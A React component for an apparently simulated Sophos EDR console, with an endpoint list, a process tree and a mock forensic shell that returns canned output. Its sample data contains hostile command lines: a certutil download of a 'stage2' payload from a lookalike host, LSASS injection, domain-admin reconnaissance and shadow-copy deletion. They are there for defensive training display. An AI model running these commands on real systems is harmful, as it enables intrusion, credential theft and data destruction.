import React, { useState } from 'react';
import {
  ShieldAlert,
  Server,
  Lock,
  Unlock,
  Terminal,
  Activity,
  AlertTriangle,
  Play,
  RotateCcw,
  CheckCircle2,
  XCircle,
  FileText,
  CornerDownRight,
  Zap,
} from 'lucide-react';
import { EndpointHost, ProcessNode } from '../types/soc.ts';

interface XdrEndpointViewProps {
  endpoints: EndpointHost[];
  onToggleIsolation: (hostname: string) => void;
  onPivotToHunting: (indicator: string) => void;
}

export const XdrEndpointView: React.FC<XdrEndpointViewProps> = ({
  endpoints,
  onToggleIsolation,
  onPivotToHunting,
}) => {
  const [selectedHost, setSelectedHost] = useState<EndpointHost>(
    endpoints.find((h) => h.hostname === 'WS-FINANCE-07') || endpoints[0]
  );
  const [showShellModal, setShowShellModal] = useState(false);
  const [shellCommand, setShellCommand] = useState('');
  const [shellHistory, setShellHistory] = useState<
    { command: string; output: string; time: string }[]
  >([
    {
      command: 'sophos-cli --status',
      output: 'Sophos Intercept X Core Agent v2026.3.1 - Behavioral CryptoGuard: ACTIVE | Deep Learning Exploit Prevention: TRIGGERED (Host Quarantine Recommended)',
      time: '23:44:12',
    },
    {
      command: 'tasklist /v | findstr update.exe',
      output: 'update.exe    9014 Console   1    48,120 K Unknown   CORP\\m.jenkins   0:00:04 [OPEN_HANDLE: LSASS.EXE PID 724]',
      time: '23:45:01',
    },
  ]);

  // Process tree on WS-FINANCE-07
  const [processes, setProcesses] = useState<ProcessNode[]>([
    {
      pid: 2040,
      ppid: 1100,
      name: 'explorer.exe',
      commandLine: 'C:\\Windows\\explorer.exe',
      user: 'CORP\\m.jenkins',
      startTime: '2026-10-06 21:00:10',
      hash: '3f5a2b1c0d9e8f7a6b5c4d3e210987654321fedcba0987654321abcdef012345',
      status: 'running',
      suspicious: false,
      children: [
        {
          pid: 4892,
          ppid: 2040,
          name: 'EXCEL.EXE',
          commandLine: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" /dde C:\\Users\\m.jenkins\\Downloads\\Invoice_Q3_2026.xlsm',
          user: 'CORP\\m.jenkins',
          startTime: '2026-10-06 23:41:50',
          hash: '6a5b4c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b',
          status: 'running',
          suspicious: true,
          detectionReason: 'Weaponized VBA Macro Execution',
          children: [
            {
              pid: 8812,
              ppid: 4892,
              name: 'certutil.exe',
              commandLine: 'certutil.exe -urlcache -split -f https://raw.githubusercontent-cdn.top/stage2.bin C:\\Users\\Public\\update.exe',
              user: 'CORP\\m.jenkins',
              startTime: '2026-10-06 23:42:15',
              hash: '8f4c2e6b91a7d3f048e5b6c2d1e0f9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d3e2',
              status: 'terminated',
              suspicious: true,
              detectionReason: 'LOLBin Downloader Execution (T1218.011)',
            },
            {
              pid: 9014,
              ppid: 4892,
              name: 'update.exe',
              commandLine: 'C:\\Users\\Public\\update.exe --inject-lsass',
              user: 'CORP\\m.jenkins',
              startTime: '2026-10-06 23:42:48',
              hash: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
              status: 'running',
              suspicious: true,
              detectionReason: 'Sophos Intercept X: Credential Guard violation / Memory Inject',
              children: [
                {
                  pid: 9440,
                  ppid: 9014,
                  name: 'cmd.exe',
                  commandLine: 'cmd.exe /c whoami /priv & net group "Domain Admins" /domain',
                  user: 'CORP\\m.jenkins',
                  startTime: '2026-10-06 23:43:02',
                  hash: '1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b',
                  status: 'running',
                  suspicious: true,
                  detectionReason: 'Discovery / Reconnaissance Execution',
                },
              ],
            },
          ],
        },
      ],
    },
  ]);

  const handleKillProcess = (pid: number) => {
    const markTerminated = (list: ProcessNode[]): ProcessNode[] => {
      return list.map((p) => {
        if (p.pid === pid) {
          return {
            ...p,
            status: 'terminated',
            children: p.children ? markTerminated(p.children) : undefined,
          };
        }
        return {
          ...p,
          children: p.children ? markTerminated(p.children) : undefined,
        };
      });
    };
    setProcesses(markTerminated(processes));
  };

  const handleRunShellCommand = (cmdToRun?: string) => {
    const cmd = cmdToRun || shellCommand;
    if (!cmd.trim()) return;

    let output = '';
    const lower = cmd.toLowerCase().trim();

    if (lower.includes('isolate')) {
      onToggleIsolation(selectedHost.hostname);
      output = `[+] SOPHOS ISOLATION ACTION EXECUTED: Network isolation enforced on ${selectedHost.hostname}. All IP traffic severed except Sophos Cloud Relay (10.0.0.1:443).`;
    } else if (lower.includes('tasklist') || lower.includes('ps')) {
      output = `PID    Process Name     Session    RAM Usage    Threat Status\n2040   explorer.exe     Console    98,400 K     BENIGN\n4892   EXCEL.EXE        Console   145,200 K     SUSPICIOUS (Parent)\n9014   update.exe       Console    48,120 K     MALICIOUS (Target)\n9440   cmd.exe          Console     4,200 K     ACTIVE RECON`;
    } else if (lower.includes('netstat')) {
      output = `Proto  Local Address          Foreign Address        State        PID\nTCP    192.168.10.45:49782    185.220.101.5:8443     ESTABLISHED  9014 (update.exe)\nTCP    192.168.10.45:49801    192.168.1.10:445       TIME_WAIT    9014 (SMB DC-CORP-01)`;
    } else if (lower.includes('vssadmin')) {
      output = `vssadmin 1.1 - Volume Shadow Copy Service administrative tool\nError: No items found that satisfy the query. (Shadow copies previously deleted via vssadmin delete shadows /all)`;
    } else if (lower.includes('whoami')) {
      output = `User Name: CORP\\m.jenkins\nPrivileges: SeChangeNotifyPrivilege (Enabled), SeIncreaseWorkingSetPrivilege (Enabled)`;
    } else {
      output = `[Sophos Live Response Shell] Executed: "${cmd}". Return code: 0 (OK). Telemetry piped to SIEM.`;
    }

    setShellHistory((prev) => [
      ...prev,
      { command: cmd, output, time: new Date().toLocaleTimeString() },
    ]);
    setShellCommand('');
  };

  // Render recursive process tree
  const renderProcessNode = (node: ProcessNode, depth = 0) => {
    const isTerminated = node.status === 'terminated';

    return (
      <div key={node.pid} className="space-y-2">
        <div
          className={`p-2.5 rounded border transition flex flex-wrap items-center justify-between gap-2 ${
            depth > 0 ? 'ml-6 border-l-2' : ''
          } ${
            isTerminated
              ? 'bg-slate-950/40 border-slate-800 opacity-60'
              : node.suspicious
              ? 'bg-red-950/30 border-red-800/80 shadow-[0_0_10px_rgba(239,68,68,0.15)]'
              : 'bg-slate-950 border-slate-800'
          }`}
        >
          <div className="flex items-center gap-2">
            {depth > 0 && <CornerDownRight className="w-3.5 h-3.5 text-slate-500" />}
            <div>
              <div className="flex items-center gap-2">
                <span className="font-bold text-xs text-slate-200">{node.name}</span>
                <span className="text-[10px] px-1 py-0.2 rounded bg-slate-800 text-slate-400">
                  PID: {node.pid}
                </span>
                <span className="text-[10px] text-slate-500">{node.user}</span>
                <span
                  className={`text-[9px] px-1.5 py-0.2 rounded font-bold uppercase ${
                    isTerminated
                      ? 'bg-slate-800 text-slate-400'
                      : node.suspicious
                      ? 'bg-red-900 text-red-200'
                      : 'bg-emerald-950 text-emerald-300'
                  }`}
                >
                  {node.status}
                </span>
              </div>
              <div className="text-[10px] text-yellow-300 break-all font-mono mt-0.5">
                {node.commandLine}
              </div>
              {node.detectionReason && (
                <div className="text-[10px] text-red-400 font-semibold mt-0.5">
                  ⚠ {node.detectionReason}
                </div>
              )}
            </div>
          </div>

          <div className="flex items-center gap-1.5">
            {!isTerminated && node.suspicious && (
              <button
                onClick={() => handleKillProcess(node.pid)}
                className="px-2 py-1 rounded bg-red-950 hover:bg-red-900 text-red-200 border border-red-800 text-[10px] font-bold"
              >
                Kill Process
              </button>
            )}
            <button
              onClick={() => onPivotToHunting(node.hash)}
              className="px-2 py-1 rounded bg-slate-800 hover:bg-slate-700 text-slate-300 text-[10px]"
            >
              Pivot Hash
            </button>
          </div>
        </div>

        {node.children && (
          <div className="space-y-2">
            {node.children.map((child) => renderProcessNode(child, depth + 1))}
          </div>
        )}
      </div>
    );
  };

  return (
    <div className="space-y-4 font-mono">
      {/* Fleet Overview Strip */}
      <div className="p-4 rounded-lg bg-white dark:bg-slate-900/90 border border-slate-200 dark:border-slate-800 shadow-sm flex flex-wrap items-center justify-between gap-3 transition-colors">
        <div>
          <div className="flex items-center gap-2">
            <ShieldAlert className="w-5 h-5 text-cyan-600 dark:text-cyan-400" />
            <h2 className="text-sm font-bold text-slate-900 dark:text-slate-100">
              SOPHOS INTERCEPT X & EDR DEFENSE CONSOLE
            </h2>
          </div>
          <p className="text-[10px] text-slate-500 dark:text-slate-400 mt-0.5">
            Active Endpoint Telemetry, Live Process Tree Inspection, CryptoGuard Ransomware Mitigation, and Network Containment
          </p>
        </div>

        <div className="flex items-center gap-2">
          <button
            onClick={() => setShowShellModal(true)}
            className="px-3 py-1.5 rounded bg-slate-100 dark:bg-slate-800 hover:bg-slate-200 dark:hover:bg-slate-700 text-cyan-800 dark:text-cyan-300 border border-slate-300 dark:border-slate-700 text-xs font-bold flex items-center gap-1.5 transition cursor-pointer"
          >
            <Terminal className="w-3.5 h-3.5" />
            <span>Open Forensic Live Shell</span>
          </button>
        </div>
      </div>

      {/* Grid: Host Fleet Inventory & Selected Host Deep Dive */}
      <div className="grid grid-cols-1 lg:grid-cols-3 gap-4">
        {/* Left: Endpoint Fleet List (1 Col) */}
        <div className="p-4 rounded-lg bg-white dark:bg-slate-900/90 border border-slate-200 dark:border-slate-800 shadow-sm space-y-3 transition-colors">
          <div className="flex items-center justify-between border-b border-slate-200 dark:border-slate-800 pb-2">
            <span className="text-xs font-bold text-slate-900 dark:text-slate-200">
              ENTERPRISE ENDPOINTS ({endpoints.length})
            </span>
            <span className="text-[10px] text-slate-500 dark:text-slate-400">Agent Heartbeat Live</span>
          </div>

          <div className="space-y-2">
            {endpoints.map((host) => {
              const isSelected = selectedHost.hostname === host.hostname;
              const isCompromised = host.status === 'compromised';
              const isIsolated = host.status === 'isolated';

              return (
                <div
                  key={host.id}
                  onClick={() => setSelectedHost(host)}
                  className={`p-3 rounded border cursor-pointer transition space-y-1.5 ${
                    isSelected
                      ? 'bg-cyan-50 dark:bg-cyan-950/40 border-cyan-500 dark:border-cyan-400 ring-1 ring-cyan-500 dark:ring-cyan-400/40'
                      : isCompromised
                      ? 'bg-red-50 dark:bg-red-950/20 border-red-300 dark:border-red-800/60 hover:bg-red-100 dark:hover:bg-red-950/30'
                      : 'bg-slate-50 dark:bg-slate-950 border-slate-200 dark:border-slate-850 hover:bg-slate-100 dark:hover:bg-slate-900'
                  }`}
                >
                  <div className="flex items-start justify-between">
                    <div>
                      <div className="font-bold text-xs text-slate-900 dark:text-slate-200 flex items-center gap-1.5">
                        <Server className="w-3.5 h-3.5 text-cyan-600 dark:text-cyan-400" />
                        <span>{host.hostname}</span>
                      </div>
                      <div className="text-[10px] text-slate-500 dark:text-slate-400">{host.ip} • {host.os}</div>
                    </div>
                    <span
                      className={`text-[9px] px-1.5 py-0.2 rounded font-bold uppercase ${
                        isIsolated
                          ? 'bg-amber-100 dark:bg-amber-950 text-amber-800 dark:text-amber-300 border border-amber-300 dark:border-amber-800'
                          : isCompromised
                          ? 'bg-red-100 dark:bg-red-950 text-red-800 dark:text-red-300 border border-red-300 dark:border-red-800 animate-pulse'
                          : 'bg-emerald-100 dark:bg-emerald-950 text-emerald-800 dark:text-emerald-300 border border-emerald-300 dark:border-emerald-800'
                      }`}
                    >
                      {host.status}
                    </span>
                  </div>

                  <div className="flex items-center justify-between text-[10px] text-slate-500 dark:text-slate-400 pt-1 border-t border-slate-200 dark:border-slate-900">
                    <span>Risk: {host.riskScore}/100</span>
                    <span className="text-red-600 dark:text-red-400 font-semibold">{host.activeAlertsCount} Alerts</span>
                  </div>
                </div>
              );
            })}
          </div>
        </div>

        {/* Right: Selected Host Details & Process Execution Hierarchy (2 Cols) */}
        <div className="lg:col-span-2 p-4 rounded-lg bg-white dark:bg-slate-900/90 border border-slate-200 dark:border-slate-800 shadow-sm space-y-4 transition-colors">
          {/* Host Banner & Actions */}
          <div className="flex flex-wrap items-center justify-between gap-3 border-b border-slate-200 dark:border-slate-800 pb-3">
            <div>
              <div className="flex items-center gap-2">
                <h3 className="text-base font-bold text-slate-900 dark:text-slate-100">{selectedHost.hostname}</h3>
                <span className="text-xs text-slate-500 dark:text-slate-400 font-mono">({selectedHost.ip})</span>
                <span
                  className={`text-xs px-2 py-0.2 rounded font-bold uppercase ${
                    selectedHost.status === 'isolated'
                      ? 'bg-amber-100 dark:bg-amber-950 text-amber-800 dark:text-amber-300 border border-amber-300 dark:border-amber-800'
                      : selectedHost.status === 'compromised'
                      ? 'bg-red-100 dark:bg-red-950 text-red-800 dark:text-red-300 border border-red-300 dark:border-red-800'
                      : 'bg-emerald-100 dark:bg-emerald-950 text-emerald-800 dark:text-emerald-300 border border-emerald-300 dark:border-emerald-800'
                  }`}
                >
                  {selectedHost.status}
                </span>
              </div>
              <div className="text-[11px] text-slate-500 dark:text-slate-400 mt-0.5">
                OS: {selectedHost.os} | Agent: {selectedHost.agentVersion} | User: {selectedHost.user}
              </div>
            </div>

            {/* Network Isolation Toggle Button */}
            <div className="flex items-center gap-2">
              <button
                onClick={() => onToggleIsolation(selectedHost.hostname)}
                className={`px-3 py-1.5 rounded text-xs font-bold flex items-center gap-1.5 transition cursor-pointer ${
                  selectedHost.status === 'isolated'
                    ? 'bg-emerald-700 hover:bg-emerald-600 text-white'
                    : 'bg-red-700 hover:bg-red-600 text-white shadow-[0_0_12px_rgba(239,68,68,0.4)]'
                }`}
              >
                {selectedHost.status === 'isolated' ? (
                  <>
                    <Unlock className="w-3.5 h-3.5" />
                    <span>Rejoin Endpoint to Subnet</span>
                  </>
                ) : (
                  <>
                    <Lock className="w-3.5 h-3.5" />
                    <span>Enforce Sophos Host Isolation</span>
                  </>
                )}
              </button>
            </div>
          </div>

          {/* Process Tree Inspection */}
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-xs font-bold text-slate-900 dark:text-slate-200">
                BEHAVIORAL PROCESS EXECUTION TREE (LOLBins & Injections)
              </span>
              <span className="text-[10px] text-slate-500 dark:text-slate-400">Parent-Child Lineage Analysis</span>
            </div>

            <div className="p-3 rounded-lg bg-slate-50 dark:bg-slate-950 border border-slate-200 dark:border-slate-850 space-y-2 max-h-[460px] overflow-y-auto scrollbar-thin transition-colors">
              {processes.map((proc) => renderProcessNode(proc))}
            </div>
          </div>
        </div>
      </div>

      {/* Forensic Live Shell Simulator Modal */}
      {showShellModal && (
        <div className="fixed inset-0 bg-slate-950/85 backdrop-blur-sm z-50 flex items-center justify-center p-4">
          <div className="bg-slate-900 border border-slate-700 rounded-lg max-w-3xl w-full p-5 space-y-4 shadow-2xl font-mono text-xs">
            <div className="flex items-center justify-between border-b border-slate-800 pb-2">
              <div className="flex items-center gap-2">
                <Terminal className="w-4 h-4 text-emerald-400" />
                <h3 className="font-bold text-slate-100 text-sm">
                  SOPHOS LIVE RESPONSE REMOTE FORENSIC SHELL [{selectedHost.hostname}]
                </h3>
              </div>
              <button
                onClick={() => setShowShellModal(false)}
                className="text-slate-400 hover:text-slate-200"
              >
                [CLOSE]
              </button>
            </div>

            {/* Quick Shell Macros */}
            <div className="flex flex-wrap items-center gap-1.5 text-[10px]">
              <span className="text-slate-500">COMMON INVESTIGATION MACROS:</span>
              <button
                onClick={() => handleRunShellCommand('sophos-cli --status')}
                className="px-2 py-0.5 rounded bg-slate-800 text-slate-300 hover:bg-slate-700"
              >
                sophos-cli --status
              </button>
              <button
                onClick={() => handleRunShellCommand('tasklist /v | findstr update.exe')}
                className="px-2 py-0.5 rounded bg-slate-800 text-slate-300 hover:bg-slate-700"
              >
                tasklist /v
              </button>
              <button
                onClick={() => handleRunShellCommand('netstat -ano | findstr 8443')}
                className="px-2 py-0.5 rounded bg-slate-800 text-slate-300 hover:bg-slate-700"
              >
                netstat -ano (C2 port check)
              </button>
              <button
                onClick={() => handleRunShellCommand('vssadmin list shadows')}
                className="px-2 py-0.5 rounded bg-slate-800 text-slate-300 hover:bg-slate-700"
              >
                vssadmin list shadows
              </button>
              <button
                onClick={() => handleRunShellCommand('sophos-cli isolate')}
                className="px-2 py-0.5 rounded bg-red-950 text-red-300 hover:bg-red-900 font-bold"
              >
                isolate host
              </button>
            </div>

            {/* Terminal Screen */}
            <div className="p-3 rounded bg-slate-950 border border-slate-800 h-64 overflow-y-auto space-y-2 font-mono text-xs scrollbar-thin">
              <div className="text-slate-500 text-[11px]">
                Connecting to Sophos Core Agent on {selectedHost.hostname} ({selectedHost.ip})... Authenticated via mTLS token.
              </div>
              {shellHistory.map((h, i) => (
                <div key={i} className="space-y-0.5">
                  <div className="text-cyan-400 flex items-center gap-1">
                    <span className="text-slate-500">[{h.time}]</span>
                    <span>C:\Windows\system32&gt; {h.command}</span>
                  </div>
                  <pre className="text-slate-300 whitespace-pre-wrap pl-4 text-[11px] font-mono">
                    {h.output}
                  </pre>
                </div>
              ))}
            </div>

            {/* Command Input Bar */}
            <div className="flex gap-2">
              <input
                type="text"
                value={shellCommand}
                onChange={(e) => setShellCommand(e.target.value)}
                onKeyDown={(e) => {
                  if (e.key === 'Enter') handleRunShellCommand();
                }}
                placeholder="Enter command (e.g. tasklist, netstat -ano, vssadmin list shadows, whoami)..."
                className="flex-1 bg-slate-950 border border-slate-700 rounded px-3 py-1.5 text-cyan-300 text-xs focus:outline-none focus:border-cyan-400"
              />
              <button
                onClick={() => handleRunShellCommand()}
                className="px-4 py-1.5 bg-cyan-600 hover:bg-cyan-500 text-slate-950 font-bold rounded text-xs"
              >
                Run
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
